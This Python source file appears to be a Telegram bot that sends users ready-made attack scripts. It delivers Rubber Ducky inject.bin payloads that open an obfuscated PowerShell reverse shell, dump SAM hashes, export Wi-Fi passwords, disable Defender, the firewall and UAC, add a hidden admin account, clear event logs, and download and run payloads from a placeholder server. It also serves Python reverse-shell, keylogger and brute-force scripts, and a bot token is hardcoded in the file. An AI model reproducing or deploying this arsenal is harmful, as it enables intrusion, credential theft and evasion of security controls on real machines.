import os
import logging
import json
import time
import hashlib
import random
import string
import socket
import subprocess
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Document
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ============================================================
# ТВОИ ДАННЫЕ
# ============================================================
BOT_TOKEN = "8687718580:AAE_uMnb9CrRBDER8cqi4f-xwzBrcfh_kQM"
ADMIN_ID = 8632158680

TEMP_FOLDER = "temp_files"
os.makedirs(TEMP_FOLDER, exist_ok=True)

# ============================================================
# DUCKY-СКРИПТЫ (25+) — ВСЕ ФАЙЛЫ БУДУТ inject.bin
# ============================================================
DUCKY_SCRIPTS = {
    "windows_info": {
        "desc": "📊 Сбор системной информации (OS, IP, пользователи)",
        "code": """REM Windows Info Grabber
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING systeminfo & ipconfig /all & net user & whoami > C:\\Windows\\Temp\\sysinfo.txt
ENTER
DELAY 300
STRING notepad C:\\Windows\\Temp\\sysinfo.txt
ENTER
"""
    },
    "grab_wifi": {
        "desc": "📶 Экспорт всех Wi-Fi паролей",
        "code": """REM Wi-Fi Passwords Grabber
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING netsh wlan show profiles & netsh wlan export profile key=clear > C:\\Windows\\Temp\\wifi.txt
ENTER
DELAY 300
STRING notepad C:\\Windows\\Temp\\wifi.txt
ENTER
"""
    },
    "reverse_shell": {
        "desc": "💀 Обратный шелл (замени IP:PORT)",
        "code": """REM Reverse Shell (change IP:PORT)
DELAY 500
GUI r
DELAY 300
STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Enc
ENTER
DELAY 300
STRING JABlAHQAIAA9ACAAJAB0AHIAeQB7ACQAYwBsAGkAZQBuAHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABjAHAAQwBsAGkAZQBuAHQAKAAiADEAMQAwAC4AMAAuADAALgAxACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHUAZgBmAGUAcgAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAdQBmAGYAZQByACwAIAAwACwAIAAkAGIAdQBmAGYAZQByAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAdQBmAGYAZQByACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQB9AGMAYQB0AGMAaAB7AH0A
ENTER
"""
    },
    "disable_defender": {
        "desc": "🔒 Отключение Windows Defender",
        "code": """REM Disable Defender
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableBlockAtFirstSeen $true
ENTER
"""
    },
    "create_admin": {
        "desc": "👑 Создание скрытого администратора (hacker/P@ssw0rd123)",
        "code": """REM Create Admin
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING net user hacker P@ssw0rd123 /add & net localgroup administrators hacker /add & net localgroup "Remote Desktop Users" hacker /add
ENTER
"""
    },
    "keylogger_install": {
        "desc": "⌨️ Установка кейлоггера через стартовую папку",
        "code": """REM Keylogger Install
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING $WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut("$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\logger.lnk"); $Shortcut.TargetPath = "powershell.exe"; $Shortcut.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\keylogger.ps1"; $Shortcut.Save()
ENTER
"""
    },
    "dump_hashes": {
        "desc": "💾 Дамп хешей SAM/SYSTEM/SECURITY",
        "code": """REM Dump Hashes
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING reg save HKLM\\SAM C:\\Windows\\Temp\\SAM & reg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM & reg save HKLM\\SECURITY C:\\Windows\\Temp\\SECURITY
ENTER
"""
    },
    "enable_rdp": {
        "desc": "🖥️ Включение RDP и открытие порта в фаерволе",
        "code": """REM Enable RDP
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & netsh advfirewall firewall set rule group="Remote Desktop" new enable=Yes
ENTER
"""
    },
    "persistence": {
        "desc": "💀 Персистентность через реестр (Run)",
        "code": """REM Persistence
DELAY 500
GUI r
DELAY 300
STRING reg
ENTER
DELAY 300
STRING add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d "C:\\Windows\\Temp\\backdoor.exe" /f
ENTER
"""
    },
    "disable_firewall": {
        "desc": "🔥 Отключение брандмауэра Windows",
        "code": """REM Disable Firewall
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING netsh advfirewall set allprofiles state off
ENTER
"""
    },
    "disable_uac": {
        "desc": "🔓 Отключение UAC (User Account Control)",
        "code": """REM Disable UAC
DELAY 500
GUI r
DELAY 300
STRING reg
ENTER
DELAY 300
STRING add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f
ENTER
"""
    },
    "clear_events": {
        "desc": "🧹 Очистка журналов событий Windows",
        "code": """REM Clear Event Logs
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING wevtutil cl System & wevtutil cl Security & wevtutil cl Application
ENTER
"""
    },
    "disable_services": {
        "desc": "⛔ Отключение служб (обновления, BITS)",
        "code": """REM Disable Services
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING sc stop wuauserv & sc config wuauserv start=disabled & sc stop BITS & sc config BITS start=disabled
ENTER
"""
    },
    "screen_capture": {
        "desc": "📸 Скриншот рабочего стола",
        "code": """REM Screenshot
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING Add-Type -AssemblyName System.Windows.Forms; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size); $bitmap.Save('C:\\Windows\\Temp\\screenshot.png')
ENTER
"""
    },
    "clipboard_grab": {
        "desc": "📋 Сбор содержимого буфера обмена",
        "code": """REM Grab Clipboard
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING Get-Clipboard > C:\\Windows\\Temp\\clipboard.txt
ENTER
"""
    },
    "system_restore": {
        "desc": "♻️ Создание точки восстановления системы",
        "code": """REM System Restore Point
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING wmic.exe /Namespace:\\\\root\\default Path SystemRestore Call CreateRestorePoint "Backup" 100 7
ENTER
"""
    },
    "bitlocker_status": {
        "desc": "🔐 Статус BitLocker",
        "code": """REM BitLocker Status
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING Get-BitLockerVolume > C:\\Windows\\Temp\\bitlocker.txt
ENTER
"""
    },
    "network_shares": {
        "desc": "📂 Список сетевых папок и расшаренных ресурсов",
        "code": """REM Network Shares
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING net view & net share > C:\\Windows\\Temp\\shares.txt
ENTER
"""
    },
    "installed_software": {
        "desc": "📦 Список установленного ПО",
        "code": """REM Installed Software
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select DisplayName, DisplayVersion > C:\\Windows\\Temp\\software.txt
ENTER
"""
    },
    "enable_winrm": {
        "desc": "🔧 Включение WinRM для удалённого управления",
        "code": """REM Enable WinRM
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING winrm quickconfig -q & winrm set winrm/config/service/auth '@{Basic="true"}' & winrm set winrm/config/service '@{AllowUnencrypted="true"}'
ENTER
"""
    },
    "download_payload": {
        "desc": "📥 Скачивание и запуск полезной нагрузки",
        "code": """REM Download Payload
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING Invoke-WebRequest -Uri "http://your-server/payload.exe" -OutFile "C:\\Windows\\Temp\\payload.exe"
ENTER
DELAY 300
STRING C:\\Windows\\Temp\\payload.exe
ENTER
"""
    },
    "grab_browser": {
        "desc": "🌐 Сбор паролей из браузеров (LaZagne)",
        "code": """REM Grab Browser Passwords
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING Invoke-WebRequest -Uri "http://your-server/laZagne.exe" -OutFile "C:\\Windows\\Temp\\laZagne.exe"
ENTER
DELAY 300
STRING C:\\Windows\\Temp\\laZagne.exe all -oN C:\\Windows\\Temp\\passwords.txt
ENTER
"""
    },
    "firewall_rules": {
        "desc": "🛡️ Экспорт правил брандмауэра",
        "code": """REM Firewall Rules Export
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING netsh advfirewall firewall show rule name=all > C:\\Windows\\Temp\\fw_rules.txt
ENTER
"""
    },
    "nmap_scan": {
        "desc": "🌐 Сканирование сети через Nmap (если установлен)",
        "code": """REM Nmap Scan
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING nmap -sP 192.168.1.0/24 > C:\\Windows\\Temp\\nmap_scan.txt
ENTER
"""
    },
    "wifi_passwords": {
        "desc": "🔑 Экспорт всех Wi-Fi профилей и паролей",
        "code": """REM Wi-Fi Passwords Export
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING netsh wlan show profiles | findstr ":" > C:\\Windows\\Temp\\wifi_profiles.txt
ENTER
DELAY 300
STRING netsh wlan export profile key=clear > C:\\Windows\\Temp\\wifi_keys.txt
ENTER
"""
    },
    "disable_defender_permanent": {
        "desc": "🚫 Полное отключение Defender (включая планировщик)",
        "code": """REM Disable Defender Permanent
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
ENTER
DELAY 300
STRING reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
ENTER
DELAY 300
STRING schtasks /change /tn "Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan" /disable
ENTER
"""
    },
    "enable_telemetry": {
        "desc": "📡 Включение телеметрии Windows (максимальный уровень)",
        "code": """REM Enable Telemetry
DELAY 500
GUI r
DELAY 300
STRING reg
ENTER
DELAY 300
STRING add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\DataCollection /v AllowTelemetry /t REG_DWORD /d 3 /f
ENTER
"""
    },
}

# ============================================================
# PYTHON-СКРИПТЫ (15+) — ФАЙЛЫ ОТПРАВЛЯЮТСЯ КАК .py
# ============================================================
PYTHON_SCRIPTS = {
    "osint_by_email": """import requests, json, sys
def osint_email(email):
    print(f"[+] Searching {email}")
    try:
        r = requests.get(f"https://api.leakcheck.net/?key=YOUR_KEY&login={email}")
        for item in r.json().get('results', []): print(f"  [+] {item['source']}")
    except: print("[-] Error")
if __name__ == "__main__":
    if len(sys.argv) < 2: print("Usage: python osint_by_email.py <email>"); sys.exit(1)
    osint_email(sys.argv[1])
""",
    "wifi_bruteforce": """import subprocess, sys, time
def bruteforce(ssid, wordlist):
    print(f"[+] Bruteforcing {ssid}")
    with open(wordlist) as f:
        for p in f:
            p = p.strip()
            r = subprocess.run(['nmcli', 'dev', 'wifi', 'connect', ssid, 'password', p], capture_output=True)
            if 'successful' in r.stdout.decode(): print(f"[+] Found: {p}"); return
    print("[-] Not found")
if __name__ == "__main__":
    if len(sys.argv) < 3: print("Usage: python wifi_bruteforce.py <ssid> <wordlist>"); sys.exit(1)
    bruteforce(sys.argv[1], sys.argv[2])
""",
    "port_scanner": """import socket, sys
def scan(ip):
    print(f"[+] Scanning {ip}")
    open_ports = []
    for p in range(1, 1025):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(1)
        if s.connect_ex((ip, p)) == 0: open_ports.append(p)
        s.close()
    print(f"[+] Open: {open_ports}")
if __name__ == "__main__":
    if len(sys.argv) < 2: print("Usage: python port_scanner.py <ip>"); sys.exit(1)
    scan(sys.argv[1])
""",
    "file_encryptor": """import os, sys; from cryptography.fernet import Fernet
def encrypt(f):
    with open(f, 'rb') as x: data = x.read()
    key = Fernet.generate_key(); c = Fernet(key)
    with open(f + '.encrypted', 'wb') as x: x.write(c.encrypt(data))
    os.remove(f); print(f"[+] Encrypted: {f}\\n[+] Key: {key.decode()}")
if __name__ == "__main__":
    if len(sys.argv) < 2: print("Usage: python file_encryptor.py <file>"); sys.exit(1)
    encrypt(sys.argv[1])
""",
    "sql_injection_scanner": """import requests, sys
def test(url, param):
    payloads = ["' OR '1'='1", "' UNION SELECT NULL--", "' AND 1=1--"]
    for p in payloads:
        r = requests.get(url, params={param: p})
        if "error" not in r.text.lower() and "mysql" not in r.text.lower():
            print(f"[+] Vuln: {url}?{param}={p}"); return
    print("[-] No SQLi")
if __name__ == "__main__":
    if len(sys.argv) < 3: print("Usage: python sql_injection_scanner.py <url> <param>"); sys.exit(1)
    test(sys.argv[1], sys.argv[2])
""",
    "subdomain_finder": """import requests, sys
def find(domain):
    subs = ['www','mail','admin','dev','test','api','ftp','ssh','vpn','backup','blog','shop','forum','portal','crm','demo','stage','beta','alpha','dev2','staging','uat','qa','internal','corp','mobile','app','web','cloud','cdn','static','media','files','docs','help','support','community','store','shop','secure','login','account','auth','sso','oauth','pay','payment','api2','v2','v3','v4','ws','soap','rest','graphql','mqtt']
    for s in subs:
        try:
            r = requests.get(f"https://{s}.{domain}", timeout=2)
            if r.status_code == 200: print(f"[+] Found: {s}.{domain}")
        except: pass
if __name__ == "__main__":
    if len(sys.argv) < 2: print("Usage: python subdomain_finder.py <domain>"); sys.exit(1)
    find(sys.argv[1])
""",
    "ssh_bruteforce": """import paramiko, sys
def ssh_bruteforce(host, user, wordlist):
    print(f"[+] Bruteforcing {user}@{host}")
    with open(wordlist) as f:
        for p in f:
            p = p.strip()
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(host, username=user, password=p, timeout=3)
                print(f"[+] Found: {p}")
                client.close()
                return
            except: pass
    print("[-] Not found")
if __name__ == "__main__":
    if len(sys.argv) < 4: print("Usage: python ssh_bruteforce.py <host> <user> <wordlist>"); sys.exit(1)
    ssh_bruteforce(sys.argv[1], sys.argv[2], sys.argv[3])
""",
    "dirbuster": """import requests, sys
def dirbuster(url, wordlist):
    print(f"[+] Dirbusting {url}")
    with open(wordlist) as f:
        for d in f:
            d = d.strip()
            r = requests.get(url + '/' + d, timeout=2)
            if r.status_code == 200: print(f"[+] Found: {url}/{d}")
if __name__ == "__main__":
    if len(sys.argv) < 3: print("Usage: python dirbuster.py <url> <wordlist>"); sys.exit(1)
    dirbuster(sys.argv[1], sys.argv[2])
""",
    "password_generator": """import random, string, sys
def gen(length=16):
    chars = string.ascii_letters + string.digits + "!@#$%^&*()_+-="
    return ''.join(random.choice(chars) for _ in range(length))
if __name__ == "__main__":
    length = int(sys.argv[1]) if len(sys.argv) > 1 else 16
    print(f"[+] Password: {gen(length)}")
""",
    "hash_cracker_md5": """import hashlib, sys
def crack_md5(hash_target, wordlist):
    print(f"[+] Cracking {hash_target}")
    with open(wordlist) as f:
        for p in f:
            p = p.strip()
            if hashlib.md5(p.encode()).hexdigest() == hash_target:
                print(f"[+] Found: {p}")
                return
    print("[-] Not found")
if __name__ == "__main__":
    if len(sys.argv) < 3: print("Usage: python hash_cracker_md5.py <hash> <wordlist>"); sys.exit(1)
    crack_md5(sys.argv[1], sys.argv[2])
""",
    "whois_lookup": """import whois, sys
def whois_lookup(domain):
    try:
        w = whois.whois(domain)
        print(f"[+] Domain: {domain}")
        print(f"[+] Registrar: {w.registrar}")
        print(f"[+] Creation: {w.creation_date}")
        print(f"[+] Expiration: {w.expiration_date}")
        print(f"[+] Name Servers: {w.name_servers}")
    except: print("[-] Error")
if __name__ == "__main__":
    if len(sys.argv) < 2: print("Usage: python whois_lookup.py <domain>"); sys.exit(1)
    whois_lookup(sys.argv[1])
""",
    "ping_sweep": """import subprocess, sys
def ping_sweep(network):
    print(f"[+] Ping sweep {network}")
    for i in range(1, 255):
        ip = f"{network}.{i}"
        r = subprocess.run(['ping', '-n', '1', '-w', '100', ip], capture_output=True)
        if r.returncode == 0: print(f"[+] {ip} is up")
if __name__ == "__main__":
    if len(sys.argv) < 2: print("Usage: python ping_sweep.py <network> (e.g. 192.168.1)"); sys.exit(1)
    ping_sweep(sys.argv[1])
""",
    "dns_lookup": """import socket, sys
def dns_lookup(domain):
    try:
        ip = socket.gethostbyname(domain)
        print(f"[+] {domain} -> {ip}")
    except: print("[-] Not found")
if __name__ == "__main__":
    if len(sys.argv) < 2: print("Usage: python dns_lookup.py <domain>"); sys.exit(1)
    dns_lookup(sys.argv[1])
""",
    "simple_webserver": """import http.server, socketserver, sys
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8000
Handler = http.server.SimpleHTTPRequestHandler
with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print(f"[+] Serving at port {PORT}")
    httpd.serve_forever()
""",
    "reverse_shell_python": """import socket, subprocess, sys
host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
while True:
    cmd = s.recv(1024).decode()
    if cmd.lower() == "exit": break
    output = subprocess.run(cmd, shell=True, capture_output=True)
    s.send(output.stdout + output.stderr)
s.close()
""",
    "keylogger_python": """import keyboard, threading, time
log = ""
def on_press(event):
    global log
    log += event.name
    if len(log) > 100:
        with open("keylog.txt", "a") as f: f.write(log)
        log = ""
keyboard.on_press(on_press)
threading.Event().wait()
""",
}

# ============================================================
# БОТ (ОСНОВНАЯ ЛОГИКА)
# ============================================================
logging.basicConfig(level=logging.INFO)

async def start(update: Update, context):
    keyboard = [
        [InlineKeyboardButton("🦆 Ducky Scripts (inject.bin)", callback_data="ducky_menu")],
        [InlineKeyboardButton("🐍 Python Scripts", callback_data="python_menu")],
        [InlineKeyboardButton("📡 ESP32 Control", callback_data="esp32_menu")],
        [InlineKeyboardButton("🧰 Утилиты", callback_data="utils_menu")],
        [InlineKeyboardButton("ℹ️ О боте", callback_data="about")],
        [InlineKeyboardButton("📊 Статус", callback_data="status")],
    ]
    await update.message.reply_text(
        "🔥 **VO1D CONTROLLER v4.0**\n\n"
        "Полный арсенал для пентеста.\n"
        "Все Ducky-файлы → **inject.bin**\n"
        "Python-скрипты → **.py**",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def ducky_menu(update: Update, context):
    query = update.callback_query
    await query.answer()
    
    keyboard = []
    for name in DUCKY_SCRIPTS.keys():
        keyboard.append([InlineKeyboardButton(f"🦆 {name}", callback_data=f"ducky_{name}")])
    keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data="back_main")])
    
    await query.edit_message_text(
        "🦆 **Ducky Scripts (25+)**\n\n"
        "Каждый скрипт отправляется как **inject.bin**\n"
        "Выбери нужный:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def python_menu(update: Update, context):
    query = update.callback_query
    await query.answer()
    
    keyboard = []
    for name in PYTHON_SCRIPTS.keys():
        keyboard.append([InlineKeyboardButton(f"🐍 {name}", callback_data=f"python_{name}")])
    keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data="back_main")])
    
    await query.edit_message_text(
        "🐍 **Python Scripts (15+)**\n\n"
        "Выбери нужный скрипт. Файл придёт как **.py**:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def esp32_menu(update: Update, context):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("📡 Scan Wi-Fi", callback_data="esp_scan")],
        [InlineKeyboardButton("🔴 Deauth Attack", callback_data="esp_deauth")],
        [InlineKeyboardButton("🎯 Evil Twin AP", callback_data="esp_evil")],
        [InlineKeyboardButton("📡 BLE Scan", callback_data="esp_ble")],
        [InlineKeyboardButton("📊 Status", callback_data="esp_status")],
        [InlineKeyboardButton("🔙 Назад", callback_data="back_main")],
    ]
    
    await query.edit_message_text(
        "📡 **ESP32 Control**\n\n"
        "Управление ESP32 без экрана.\n"
        "Команды отправляются через Telegram:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def utils_menu(update: Update, context):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("🔐 Генератор паролей", callback_data="gen_pass")],
        [InlineKeyboardButton("🔑 Генератор MD5/SHA256", callback_data="gen_hash")],
        [InlineKeyboardButton("🌍 Проверка IP", callback_data="check_ip")],
        [InlineKeyboardButton("📡 Ping", callback_data="ping")],
        [InlineKeyboardButton("🔙 Назад", callback_data="back_main")],
    ]
    
    await query.edit_message_text(
        "🧰 **Утилиты**\n\n"
        "Полезные инструменты для быстрой работы:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def send_script_file(update: Update, context, script_name: str, script_data: dict, ext: str):
    """Создаёт файл и отправляет его пользователю"""
    query = update.callback_query
    await query.answer()
    
    # Для Ducky — всегда inject.bin
    if ext == "duck":
        filename = "inject.bin"
    else:
        filename = f"{script_name}.{ext}"
    
    filepath = os.path.join(TEMP_FOLDER, filename)
    
    # Создаём файл
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(script_data['code'])
    
    # Отправляем файл
    with open(filepath, 'rb') as f:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=f,
            filename=filename,
            caption=f"📄 **{script_name}**\n\n📝 {script_data['desc']}"
        )
    
    # Удаляем временный файл
    os.remove(filepath)

async def show_ducky(update: Update, context):
    query = update.callback_query
    name = query.data.replace("ducky_", "")
    script = DUCKY_SCRIPTS.get(name)
    
    if script:
        await send_script_file(update, context, name, script, "duck")

async def show_python(update: Update, context):
    query = update.callback_query
    name = query.data.replace("python_", "")
    code = PYTHON_SCRIPTS.get(name)
    
    if code:
        await send_script_file(update, context, name, {'code': code, 'desc': 'Python скрипт'}, "py")

async def esp_command(update: Update, context):
    query = update.callback_query
    await query.answer()
    
    cmd = query.data
    messages = {
        "esp_scan": "📡 **Scan Wi-Fi**\nОтправь команду на ESP32:\n`/scan`",
        "esp_deauth": "🔴 **Deauth Attack**\nВыбери цель в веб-интерфейсе ESP32",
        "esp_evil": "🎯 **Evil Twin AP**\nЗапусти фейковую точку доступа",
        "esp_ble": "📡 **BLE Scan**\nСканирование Bluetooth устройств",
        "esp_status": "📊 **Статус ESP32**\nWi-Fi: OK\nBluetooth: OK\nДеавторизация: Готова",
    }
    
    await query.edit_message_text(
        messages.get(cmd, "Команда отправлена"),
        parse_mode="Markdown"
    )

async def utils_handler(update: Update, context):
    query = update.callback_query
    await query.answer()
    
    cmd = query.data
    if cmd == "gen_pass":
        chars = string.ascii_letters + string.digits + "!@#$%^&*()_+-="
        password = ''.join(random.choice(chars) for _ in range(16))
        await query.edit_message_text(f"🔐 **Сгенерированный пароль:**\n`{password}`", parse_mode="Markdown")
    elif cmd == "gen_hash":
        text = "Строка для хеширования: test123"
        md5 = hashlib.md5(text.encode()).hexdigest()
        sha256 = hashlib.sha256(text.encode()).hexdigest()
        await query.edit_message_text(
            f"🔑 **Хеши для:** `{text}`\n\n"
            f"**MD5:** `{md5}`\n"
            f"**SHA256:** `{sha256}`",
            parse_mode="Markdown"
        )
    elif cmd == "check_ip":
        try:
            import requests
            ip = requests.get("https://api.ipify.org").text
            await query.edit_message_text(f"🌍 **Ваш IP:** `{ip}`", parse_mode="Markdown")
        except:
            await query.edit_message_text("❌ Не удалось определить IP", parse_mode="Markdown")
    elif cmd == "ping":
        await query.edit_message_text(
            "📡 **Ping**\n\n"
            "Отправь IP или домен для проверки.\n"
            "Напиши в чат: `/ping 8.8.8.8`",
            parse_mode="Markdown"
        )

async def about(update: Update, context):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "ℹ️ **О боте VO1D v4.0**\n\n"
        "🦆 **25+ Ducky-скриптов** — все отправляются как `inject.bin`\n"
        "🐍 **15+ Python-скриптов** — OSINT, брутфорс, сканеры\n"
        "📡 **ESP32** — управление без экрана\n"
        "🧰 **Утилиты** — генерация паролей, хешей, проверка IP, ping\n\n"
        "⚡ Все файлы создаются и отправляются на лету.",
        parse_mode="Markdown"
    )

async def status(update: Update, context):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "📊 **Статус бота**\n\n"
        f"🦆 Ducky: {len(DUCKY_SCRIPTS)}\n"
        f"🐍 Python: {len(PYTHON_SCRIPTS)}\n"
        f"📡 ESP32: готов\n"
        f"🧰 Утилиты: 4\n"
        f"⏱️ Время: {time.strftime('%H:%M:%S')}",
        parse_mode="Markdown"
    )

async def back_main(update: Update, context):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("🦆 Ducky Scripts (inject.bin)", callback_data="ducky_menu")],
        [InlineKeyboardButton("🐍 Python Scripts", callback_data="python_menu")],
        [InlineKeyboardButton("📡 ESP32 Control", callback_data="esp32_menu")],
        [InlineKeyboardButton("🧰 Утилиты", callback_data="utils_menu")],
        [InlineKeyboardButton("ℹ️ О боте", callback_data="about")],
        [InlineKeyboardButton("📊 Статус", callback_data="status")],
    ]
    
    await query.edit_message_text(
        "🔥 **VO1D CONTROLLER v4.0**\n\n"
        "Полный арсенал для пентеста.\n"
        "Все Ducky-файлы → **inject.bin**\n"
        "Python-скрипты → **.py**",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(ducky_menu, pattern="^ducky_menu$"))
    app.add_handler(CallbackQueryHandler(python_menu, pattern="^python_menu$"))
    app.add_handler(CallbackQueryHandler(esp32_menu, pattern="^esp32_menu$"))
    app.add_handler(CallbackQueryHandler(utils_menu, pattern="^utils_menu$"))
    app.add_handler(CallbackQueryHandler(show_ducky, pattern="^ducky_"))
    app.add_handler(CallbackQueryHandler(show_python, pattern="^python_"))
    app.add_handler(CallbackQueryHandler(esp_command, pattern="^esp_"))
    app.add_handler(CallbackQueryHandler(utils_handler, pattern="^gen_pass$|^gen_hash$|^check_ip$|^ping$"))
    app.add_handler(CallbackQueryHandler(about, pattern="^about$"))
    app.add_handler(CallbackQueryHandler(status, pattern="^status$"))
    app.add_handler(CallbackQueryHandler(back_main, pattern="^back_main$"))
    
    print("🚀 VO1D v4.0 запущен")
    app.run_polling()

if __name__ == "__main__":
    main()
